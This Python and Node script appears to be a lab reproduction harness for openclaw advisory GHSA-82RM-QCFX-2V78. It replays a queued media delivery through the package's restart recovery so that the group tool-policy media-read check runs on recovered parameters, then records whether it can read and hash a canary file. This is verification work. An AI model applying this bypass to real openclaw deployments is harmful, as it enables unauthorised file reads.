"""Mechanism reproduction for openclaw GHSA-82RM-QCFX-2V78 inside the isolated lab.

The PoC drives the pinned upstream openclaw package instead of reimplementing the
delivery queue: it enqueues a media delivery through the product's write-ahead
queue, replays it through the product's restart recovery path, and lets the
product's own group tool-policy media-read decision run on the recovered
parameters. Only the observable outcome is recorded.
"""

from __future__ import annotations

import json
import os
from pathlib import Path
import shutil
import subprocess
import tempfile

from lab_support import parser, read_context, record

# The image installs the pinned upstream package; these are the layouts the
# builder is expected to produce. OPENCLAW_PACKAGE_ROOT overrides discovery.
PACKAGE_DIR_CANDIDATES = (
    "OPENCLAW_PACKAGE_ROOT",
    "OPENCLAW_HOME",
    "/lab/openclaw",
    "/lab/upstream/openclaw",
    "/lab/vendor/openclaw",
    "/lab/node_modules/openclaw",
    "/usr/local/lib/node_modules/openclaw",
    "/usr/lib/node_modules/openclaw",
    "/opt/openclaw",
    "/input/openclaw",
    "/inputs/openclaw",
)
PACKAGE_SEARCH_ROOTS = ("/lab", "/opt", "/input", "/inputs", "/srv")
NODE_PATHS = (
    "/usr/local/bin/node",
    "/usr/bin/node",
    "/usr/local/node/bin/node",
    "/opt/node/bin/node",
)
# Discovery markers: both bundled entry points mention these symbol names, so a
# chunk that mentions them is a candidate for dynamic import. The driver then
# resolves each export independently, because bundlers are free to split the
# delivery queue, the recovery drain and the media-policy helpers across chunks.
QUEUE_MARKER = "recoverPendingDeliveries"
POLICY_MARKER = "resolveAgentScopedOutboundMediaAccess"
DRIVER_TIMEOUT = 300
SCRIPT_DIR = Path(__file__).resolve().parent

DRIVER = r'''// Drives the pinned upstream openclaw delivery queue, the restart recovery
// replay, and the group tool-policy media-read decision. No vulnerable logic is
// reimplemented: every decision below comes from the package's own exports.
import { readdirSync, readFileSync, mkdtempSync, writeFileSync } from "node:fs";
import { createHash } from "node:crypto";
import { pathToFileURL } from "node:url";
import path from "node:path";
import os from "node:os";

const pkgRoot = process.argv[2];
const scenarioPath = process.argv[3];
const outDir = process.argv[4];
const scenario = JSON.parse(readFileSync(scenarioPath, "utf8"));
const distDir = path.join(pkgRoot, "dist");
const pkg = JSON.parse(readFileSync(path.join(pkgRoot, "package.json"), "utf8"));

// Bundlers split one source module across several chunks, so walk the whole
// compiled tree and resolve every symbol on its own. A chunk only becomes an
// import candidate when its text mentions the symbol, which keeps the scan cheap.
function javascriptFiles(directory) {
  const found = [];
  let entries;
  try {
    entries = readdirSync(directory, { withFileTypes: true });
  } catch {
    return found;
  }
  for (const entry of entries) {
    const full = path.join(directory, entry.name);
    if (entry.isDirectory()) found.push(...javascriptFiles(full));
    else if (entry.isFile() && entry.name.endsWith(".js")) found.push(full);
  }
  return found;
}

const chunks = javascriptFiles(distDir).sort();
const modules = new Map();

async function load(file) {
  if (!modules.has(file)) {
    try {
      modules.set(file, await import(pathToFileURL(file).href));
    } catch {
      modules.set(file, null);
    }
  }
  return modules.get(file);
}

async function resolveExport(name) {
  for (const file of chunks) {
    let text;
    try {
      text = readFileSync(file, "utf8");
    } catch {
      continue;
    }
    if (!text.includes(name)) continue;
    const mod = await load(file);
    if (!mod) continue;
    const relative = path.relative(distDir, file);
    const direct = mod[name];
    if (typeof direct === "function") return { value: direct, file: relative };
    for (const value of Object.values(mod)) {
      if (typeof value === "function" && value.name === name) {
        return { value, file: relative };
      }
    }
  }
  return null;
}

async function requireExport(name) {
  const resolved = await resolveExport(name);
  if (!resolved) {
    throw new Error("upstream export not found under " + distDir + ": " + name);
  }
  return resolved;
}

// Essential: the write-ahead enqueue, the restart replay, and the media-read
// decision. Optional: the stored-entry reader and the policy resolver used only
// for the informational report, which some bundles keep internal.
const queueRef = await requireExport("enqueueDelivery");
const recoveryRef = await requireExport("recoverPendingDeliveries");
const mediaRef = await requireExport("resolveAgentScopedOutboundMediaAccess");
const loadRef = await resolveExport("loadPendingDelivery");
const policyRef = await resolveExport("resolveGroupToolPolicy");
const enqueueDelivery = queueRef.value;
const recoverPendingDeliveries = recoveryRef.value;
const resolveAgentScopedOutboundMediaAccess = mediaRef.value;

const stateDir = mkdtempSync(path.join(os.tmpdir(), "openclaw-queue-"));
const cfg = scenario.config;
const queued = {
  channel: scenario.channel,
  to: scenario.to,
  accountId: scenario.accountId,
  payloads: scenario.payloads,
  mirror: scenario.mirror,
  gatewayClientScopes: scenario.gatewayClientScopes,
  session: scenario.session,
};

const id = await enqueueDelivery(queued, stateDir);

let stored = null;
let storedError = null;
if (loadRef) {
  try {
    stored = await loadRef.value(id, stateDir);
  } catch (error) {
    storedError = String(error?.stack ?? error);
  }
}

const captured = [];
const log = { info() {}, warn() {}, error() {} };
await recoverPendingDeliveries({
  deliver: async (params) => {
    const { cfg: _cfg, ...rest } = params;
    captured.push(rest);
    return { messageId: "recovered" };
  },
  log,
  cfg,
  stateDir,
  maxRecoveryMs: 30000,
});
const recovered = captured[0] ?? null;

// The recovered parameters are the replay input the product itself produced.
// Project them the way the upstream delivery path reads them, then let the
// package's own media-read decision resolve the group tool policy.
const source = recovered ?? queued;
const context = {
  sessionKey: source.session?.key,
  messageProvider: source.session?.key ? undefined : source.channel,
  accountId: source.session?.requesterAccountId ?? source.accountId,
  requesterSenderId: source.session?.requesterSenderId,
  requesterSenderName: source.session?.requesterSenderName,
  requesterSenderUsername: source.session?.requesterSenderUsername,
  requesterSenderE164: source.session?.requesterSenderE164,
};
const agentId = source.session?.agentId ?? source.mirror?.agentId;
const mediaSources = (source.payloads ?? []).flatMap((p) => p?.mediaUrls ?? []);

let groupPolicy = null;
let policyError = null;
if (policyRef) {
  try {
    groupPolicy = policyRef.value({
      config: cfg,
      ...context,
      senderId: context.requesterSenderId,
      senderName: context.requesterSenderName,
      senderUsername: context.requesterSenderUsername,
      senderE164: context.requesterSenderE164,
    });
  } catch (error) {
    policyError = String(error?.stack ?? error);
  }
}

const report = {
  package_version: pkg.version,
  package_root: pkgRoot,
  queue_chunk: queueRef.file,
  recovery_chunk: recoveryRef.file,
  media_chunk: mediaRef.file,
  load_chunk: loadRef ? loadRef.file : null,
  policy_chunk: policyRef ? policyRef.file : null,
  queued_id: id,
  recovered_deliver_calls: captured.length,
  stored_entry_available: Boolean(stored),
  stored_entry_error: storedError,
  stored_entry_has_session: Boolean(stored && Object.prototype.hasOwnProperty.call(stored, "session")),
  stored_entry_session_keys: stored?.session ? Object.keys(stored.session) : [],
  recovered_params_has_session: Boolean(recovered && Object.prototype.hasOwnProperty.call(recovered, "session")),
  recovered_params_session_keys: recovered?.session ? Object.keys(recovered.session) : [],
  recovered_params_channel: recovered?.channel ?? null,
  recovered_params_skip_queue: recovered?.skipQueue ?? null,
  group_policy_present: Boolean(groupPolicy),
  group_policy_resolved: groupPolicy ?? null,
  policy_error: policyError,
  media_read_file_granted: false,
  media_access_keys: null,
  media_read_bytes_sha256: null,
  media_read_error: null,
};

let mediaAccess = null;
try {
  mediaAccess = resolveAgentScopedOutboundMediaAccess({ cfg, agentId, mediaSources, ...context });
} catch (error) {
  report.media_read_error = String(error?.stack ?? error);
}
report.media_access_keys = mediaAccess ? Object.keys(mediaAccess) : null;
report.media_read_file_granted = Boolean(mediaAccess && typeof mediaAccess.readFile === "function");

let canary = Buffer.alloc(0);
if (report.media_read_file_granted) {
  try {
    canary = Buffer.from(await mediaAccess.readFile(mediaSources[0] ?? scenario.canary_path));
    report.media_read_bytes_sha256 = createHash("sha256").update(canary).digest("hex");
  } catch (error) {
    report.media_read_error = String(error?.stack ?? error);
  }
}

writeFileSync(path.join(outDir, "queued-entry.json"), stored ? JSON.stringify(stored, null, 2) + "\n" : "{}\n");
writeFileSync(path.join(outDir, "driver-report.json"), JSON.stringify(report, null, 2) + "\n");
writeFileSync(path.join(outDir, "media-read.bin"), canary);
process.stdout.write(JSON.stringify(report));
'''

OBSERVED_KEYS = (
    "package_version",
    "package_root",
    "queue_chunk",
    "recovery_chunk",
    "media_chunk",
    "load_chunk",
    "policy_chunk",
    "queued_id",
    "recovered_deliver_calls",
    "stored_entry_available",
    "stored_entry_has_session",
    "stored_entry_session_keys",
    "recovered_params_has_session",
    "recovered_params_session_keys",
    "recovered_params_skip_queue",
    "group_policy_present",
    "group_policy_resolved",
    "media_read_file_granted",
    "media_read_bytes_sha256",
    "media_read_error",
)


def fixture_directory() -> Path:
    override = os.environ.get("AVH_FIXTURES")
    if override and Path(override).is_dir():
        return Path(override)
    container = Path("/lab/fixtures")
    if container.is_dir():
        return container
    return SCRIPT_DIR / "fixtures"


def find_node() -> str | None:
    candidates = [
        os.environ.get("AVH_NODE"),
        os.environ.get("NODE_BIN"),
        shutil.which("node"),
        *NODE_PATHS,
    ]
    for candidate in candidates:
        if candidate and Path(candidate).is_file() and os.access(candidate, os.X_OK):
            return candidate
    return None


def usable_package(root: Path) -> bool:
    manifest = root / "package.json"
    dist = root / "dist"
    if not (manifest.is_file() and dist.is_dir()):
        return False
    try:
        data = json.loads(manifest.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return False
    if data.get("name") != "openclaw":
        return False
    queue_ready = policy_ready = False
    for chunk in dist.glob("**/*.js"):
        try:
            text = chunk.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        queue_ready = queue_ready or QUEUE_MARKER in text
        policy_ready = policy_ready or POLICY_MARKER in text
        if queue_ready and policy_ready:
            return True
    return False


def find_package() -> Path | None:
    roots = []
    for name in PACKAGE_DIR_CANDIDATES[:2]:
        value = os.environ.get(name)
        if value:
            roots.append(Path(value))
    roots.extend(Path(item) for item in PACKAGE_DIR_CANDIDATES[2:])
    for root in roots:
        if root.is_dir() and usable_package(root):
            return root
    for base in PACKAGE_SEARCH_ROOTS:
        base_path = Path(base)
        if not base_path.is_dir():
            continue
        for manifest in sorted(base_path.glob("**/package.json")):
            root = manifest.parent
            if usable_package(root):
                return root
    return None


def materialize(fixture_path: Path, workspace: Path) -> Path:
    """Copy the scenario into a runtime layout and resolve workspace placeholders."""
    data = json.loads(fixture_path.read_text(encoding="utf-8"))
    canary = data.pop("canary", None)
    if canary:
        shutil.copyfile(fixture_directory() / canary, workspace / canary)
        data["canary_path"] = str(workspace / canary)
    scenario = workspace / "scenario.json"
    scenario.write_text(
        json.dumps(data, ensure_ascii=False, indent=2).replace("__WORKSPACE__", str(workspace)),
        encoding="utf-8",
    )
    return scenario


def collect_effects(directory: Path) -> dict:
    effects = {}
    for name in ("driver-report.json", "queued-entry.json", "driver-stderr.txt"):
        path = directory / name
        if path.is_file():
            effects[name] = path.read_text(encoding="utf-8", errors="replace")
    media = directory / "media-read.bin"
    if media.is_file():
        effects["media-read.bin"] = media.read_bytes()
    return effects


def main() -> int:
    args = parser(__doc__).parse_args()
    context = read_context(args.context)
    scenario_name = context["scenario"]
    fixture_path = fixture_directory() / f"{scenario_name}.json"
    observation = {
        "target_ready": False,
        "execution_status": "not_run",
        "scenario": scenario_name,
    }
    if not fixture_path.is_file():
        observation["error"] = f"scenario input is missing: {fixture_path.name}"
        return record(context, args.output, observation, {})

    node = find_node()
    package = find_package()
    if node is None or package is None:
        observation["error"] = (
            "pinned upstream package or node runtime not found "
            f"(node={node!r}, package={str(package) if package else None!r})"
        )
        return record(context, args.output, observation, {})

    with tempfile.TemporaryDirectory(prefix="openclaw-repro-") as temporary:
        workdir = Path(temporary)
        workspace = workdir / "workspace"
        workspace.mkdir()
        scenario = materialize(fixture_path, workspace)
        driver = workdir / "driver.mjs"
        driver.write_text(DRIVER, encoding="utf-8")
        output = workdir / "driver-output"
        output.mkdir()
        command = [node, str(driver), str(package), str(scenario), str(output)]
        try:
            completed = subprocess.run(
                command, cwd=str(workdir), capture_output=True, text=True, timeout=DRIVER_TIMEOUT,
            )
        except subprocess.TimeoutExpired as error:
            observation["execution_status"] = "failed"
            observation["error"] = f"upstream driver timed out after {DRIVER_TIMEOUT}s"
            effects = collect_effects(output)
            effects["driver-stderr.txt"] = str(error.stderr or "")[-4000:]
            return record(context, args.output, observation, effects)

        report_path = output / "driver-report.json"
        if completed.returncode == 0 and report_path.is_file():
            report = json.loads(report_path.read_text(encoding="utf-8"))
            observation["execution_status"] = "completed"
            observation["target_ready"] = True
            for key in OBSERVED_KEYS:
                if key in report:
                    observation[key] = report[key]
        else:
            observation["execution_status"] = "failed"
            observation["driver_returncode"] = completed.returncode
            observation["error"] = (completed.stderr or completed.stdout or "")[-2000:]
            (output / "driver-stderr.txt").write_text(
                (completed.stderr or completed.stdout or "(no output)")[-8000:], encoding="utf-8",
            )
        return record(context, args.output, observation, collect_effects(output))


if __name__ == "__main__":
    raise SystemExit(main())
